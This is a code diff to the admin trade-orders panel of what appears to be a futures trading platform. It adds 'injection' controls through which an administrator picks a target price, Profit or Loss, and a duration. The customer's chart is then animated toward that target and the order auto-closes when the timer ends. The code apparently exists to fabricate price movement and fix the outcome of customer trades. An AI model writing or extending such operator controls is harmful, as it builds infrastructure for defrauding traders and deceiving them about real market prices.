@@ -22,11 +22,14 @@ interface TradeOrder {
   referencePrice?: number;
   triggerAbove?: boolean;
   closePrice?: number;
-  closeScheduledAt?: string;
   takeProfit?: number | null;
   stopLoss?: number | null;
   pnl: number;
-  status: 'active' | 'waiting' | 'closing' | 'closed' | 'cancelled';
+  // Injection fields (set when admin triggers chart animation)
+  injectionTargetPrice?: number;
+  injectionStartedAt?:   string;
+  injectionDurationMs?:  number;
+  status: 'active' | 'waiting' | 'closed' | 'cancelled';
   closeReason?: string;
   orderNumber: string;
   openTime?: string;
@@ -134,6 +137,29 @@ function FuturesListTable() {
 
   useEffect(() => { fetchOrders(); }, [fetchOrders]);
 
+  // ── Silent auto-refresh + countdown tick ───────────────────────────────────
+  // Keeps injection countdowns live and reflects orders that auto-close server-side.
+  const [, setTick] = useState(0);
+  useEffect(() => {
+    const silentRefresh = async () => {
+      if (!tenantId) return;
+      try {
+        const params: any = {};
+        if (statusFilter !== 'all') params.status = statusFilter;
+        const { data } = await authAxios.get(`/tenant/${tenantId}/admin/trade-orders`, { params });
+        setOrders(data?.data?.rows ?? data?.rows ?? []);
+      } catch { /* ignore */ }
+    };
+    // 1 s tick for smooth countdown; refresh orders every 10 s
+    let count = 0;
+    const id = setInterval(() => {
+      setTick(t => t + 1);
+      count++;
+      if (count % 10 === 0) silentRefresh();
+    }, 1000);
+    return () => clearInterval(id);
+  }, [tenantId, statusFilter]);
+
   // ── Handlers ──────────────────────────────────────────────────────────────
 
   const handleSelectControl = (id: string, ctrl: ControlType) => {
@@ -194,7 +220,7 @@ function FuturesListTable() {
       {/* ── Toolbar ── */}
       <div className="to-toolbar">
         <div className="to-filter-group">
-          {['all', 'active', 'closing', 'waiting', 'closed', 'cancelled'].map(s => (
+          {['all', 'active', 'waiting', 'closed', 'cancelled'].map(s => (
             <button
               key={s}
               className={`to-filter-btn ${statusFilter === s ? 'active' : ''}`}
@@ -271,6 +297,9 @@ function FuturesListTable() {
                 const canClose    = ctrl !== null && pct > 0 && pct <= 100;
                 const isClosing  = closingId === order.id;
                 const isCancelling = cancellingId === order.id;
+                // Order has an active injection (chart animation running)
+                const injActive  = !!order.injectionStartedAt && !!order.injectionDurationMs &&
+                  (new Date(order.injectionStartedAt).getTime() + (order.injectionDurationMs || 0)) > Date.now();
 
                 return (
                   <tr key={order.id} className={`table-row to-row-${order.status}`}>
@@ -353,8 +382,33 @@ function FuturesListTable() {
                     {/* ── Control column ── */}
                     <td className="actions-cell">
 
-                      {/* ACTIVE: show percentage close UI */}
-                      {order.status === 'active' && (
+                      {/* ACTIVE + injection running: show live animation status */}
+                      {order.status === 'active' && injActive && (
+                        <div className="ctrl-panel">
+                          <div className="to-inject-info">
+                            <span className="to-inject-badge">
+                              <span className="to-inject-dot" /> Chart Animating
+                            </span>
+                            <span className="to-inject-timer">{fmtCountdown(
+                              order.injectionStartedAt && order.injectionDurationMs
+                                ? new Date(new Date(order.injectionStartedAt).getTime() + order.injectionDurationMs).toISOString()
+                                : undefined
+                            )}</span>
+                          </div>
+                          <div className="to-inject-target">
+                            Target&nbsp;
+                            <strong style={{ color: (order.pnl ?? order.injectionTargetPrice ?? 0) >= (order.entryPrice ?? 0) ? '#36c836' : '#e03030' }}>
+                              {fmtPrice(order.injectionTargetPrice)}
+                            </strong>
+                          </div>
+                          <div className="to-inject-note">
+                            Customer can close anytime · auto-closes when timer ends
+                          </div>
+                        </div>
+                      )}
+
+                      {/* ACTIVE (no injection): show profit/loss + duration controls */}
+                      {order.status === 'active' && !injActive && (
                         <div className="ctrl-panel">
 
                           {/* Row 1: % input + Profit / Loss buttons */}
@@ -429,30 +483,15 @@ function FuturesListTable() {
                             </div>
                           )}
 
-                          {/* Close Position button */}
+                          {/* Apply button */}
                           <button
                             type="button"
                             className="ctrl-close-btn"
                             onClick={() => handleOpenConfirm(order)}
                             disabled={!canClose || isClosing}
                           >
-                            {isClosing ? 'Closing…' : 'Close Position'}
+                            {isClosing ? 'Applying…' : 'Apply'}
                           </button>
-                        </div>
-                      )}
-
-                      {/* CLOSING: show countdown */}
-                      {order.status === 'closing' && (
-                        <div className="ctrl-panel">
-                          <div className="to-closing-info">
-                            <span className="to-closing-label">⏱ Closing in</span>
-                            <span className="to-closing-timer">{fmtCountdown(order.closeScheduledAt)}</span>
-                          </div>
-                          <div className="to-closing-target">
-                            Target: <strong style={{ color: (order.pnl ?? 0) >= 0 ? '#36c836' : '#e03030' }}>
-                              {fmtPrice(order.closePrice)}
-                            </strong>
-                          </div>
                         </div>
                       )}
 
@@ -492,6 +531,17 @@ function FuturesListTable() {
                           {order.closeReason && order.closeReason !== 'manual' && (
                             <span className="to-close-reason">{order.closeReason.toUpperCase()}</span>
                           )}
+                          {/* Injection still animating after an early customer close */}
+                          {order.status === 'closed' && injActive && (
+                            <span className="to-inject-badge" style={{ marginTop: 4 }}>
+                              <span className="to-inject-dot" /> Chart still animating&nbsp;
+                              {fmtCountdown(
+                                order.injectionStartedAt && order.injectionDurationMs
+                                  ? new Date(new Date(order.injectionStartedAt).getTime() + order.injectionDurationMs).toISOString()
+                                  : undefined
+                              )}
+                            </span>
+                          )}
                         </div>
                       )}
 
@@ -508,7 +558,9 @@ function FuturesListTable() {
       {confirmRow && (
         <div className="cp-modal-overlay" onClick={() => setConfirmRow(null)}>
           <div className="cp-modal" onClick={(e) => e.stopPropagation()}>
-            <div className="cp-modal-title">Confirm Close Position</div>
+            <div className="cp-modal-title">
+              {confirmRow.delayMin === 0 ? 'Confirm Close Position' : 'Confirm Chart Animation'}
+            </div>
             <div className="cp-modal-body">
               <div className="cp-modal-row">
                 <span>User</span>
@@ -689,7 +741,6 @@ const INLINE_CSS = `
   }
   .to-status.active    { background: rgba(16,108,245,0.15);  color: #106cf5; border: 1px solid rgba(16,108,245,0.3); }
   .to-status.waiting   { background: rgba(240,192,64,0.12);  color: #f0c040; border: 1px solid rgba(240,192,64,0.3); }
-  .to-status.closing   { background: rgba(255,140,0,0.15);   color: #ff8c00; border: 1px solid rgba(255,140,0,0.35); animation: closingPulse 2s infinite; }
   .to-status.closed    { background: rgba(100,100,100,0.15); color: #888;    border: 1px solid #444; }
   .to-status.cancelled { background: rgba(224,48,48,0.1);    color: #e03030; border: 1px solid rgba(224,48,48,0.25); }
   @keyframes closingPulse { 0%,100%{opacity:1} 50%{opacity:0.55} }
@@ -697,7 +748,6 @@ const INLINE_CSS = `
   /* Row tinting by status */
   .to-row-active    { background: rgba(16,108,245,0.03); }
   .to-row-waiting   { background: rgba(240,192,64,0.03); }
-  .to-row-closing   { background: rgba(255,140,0,0.05); }
   .to-row-closed    { opacity: 0.8; }
   .to-row-cancelled { opacity: 0.55; }
 
@@ -735,11 +785,16 @@ const INLINE_CSS = `
   .to-waiting-label { font-size: 11px; color: #888; }
   .to-waiting-price { font-size: 14px; font-weight: 700; color: #f0c040; }
 
-  /* Closing countdown */
-  .to-closing-info   { display: flex; flex-direction: column; gap: 2px; margin-bottom: 4px; }
-  .to-closing-label  { font-size: 11px; color: #888; }
-  .to-closing-timer  { font-size: 15px; font-weight: 700; color: #ff8c00; font-family: monospace; }
-  .to-closing-target { font-size: 12px; color: #aaa; }
+  /* Injection (chart animation) status */
+  .to-inject-info   { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 4px; }
+  .to-inject-badge  { display: flex; align-items: center; gap: 5px; font-size: 11px; font-weight: 700; color: #ff8c00;
+                      background: rgba(255,140,0,0.12); border: 1px solid rgba(255,140,0,0.3);
+                      border-radius: 6px; padding: 3px 8px; }
+  .to-inject-dot    { width: 7px; height: 7px; border-radius: 50%; background: #ff8c00;
+                      animation: closingPulse 1.2s ease-in-out infinite; }
+  .to-inject-timer  { font-size: 14px; font-weight: 700; color: #ff8c00; font-family: monospace; }
+  .to-inject-target { font-size: 13px; color: #aaa; }
+  .to-inject-note   { font-size: 10px; color: #777; line-height: 1.4; }
 
   /* ── Control panel ── */
   .ctrl-panel { display: flex; flex-direction: column; gap: 8px; }
